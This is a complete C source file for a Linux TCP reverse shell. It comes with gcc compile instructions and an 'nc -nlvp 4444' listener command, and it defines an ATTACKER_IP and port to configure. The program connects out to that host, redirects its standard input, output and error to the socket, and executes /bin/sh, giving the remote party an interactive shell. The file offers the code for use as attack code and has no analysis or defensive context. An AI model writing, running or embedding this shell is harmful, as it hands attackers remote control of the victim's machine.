#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

/*
 * linux-rev-shell - Linux TCP Reverse Shell
 *
 * Compile:
 *   gcc main.c -o rev_shell
 *
 * Listener:
 *   nc -nlvp 4444
 */

// -- CONFIGURE THESE --------------------------------------
#define ATTACKER_IP   "10.10.10.10"
#define ATTACKER_PORT  4444
// ---------------------------------------------------------

int main(void) {
    int sock;
    struct sockaddr_in server;

    sock = socket(AF_INET, SOCK_STREAM, 0);
    server.sin_family = AF_INET;
    server.sin_addr.s_addr = inet_addr(ATTACKER_IP);
    server.sin_port = htons(ATTACKER_PORT);

    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
        return 1;
    }

    dup2(sock, 0);  /* stdin  */
    dup2(sock, 1);  /* stdout */
    dup2(sock, 2);  /* stderr */

    execve("/bin/sh", NULL, NULL);
    return 0;
}
